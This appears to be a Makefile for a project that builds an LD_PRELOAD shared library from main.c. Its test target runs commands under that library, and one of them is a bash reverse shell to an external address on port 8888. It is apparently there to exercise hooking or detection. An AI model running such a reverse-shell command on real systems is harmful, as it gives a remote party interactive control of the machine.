default: main.c
	gcc -fPIC -fPIE -shared -Wl,--no-as-needed -ldl -o main.so main.c

test: default
	LD_PRELOAD=./main.so bash -c "sh -c 'ls -lh'; dir; bash -i >& /dev/tcp/1.1.1.1/8888 0>&1"
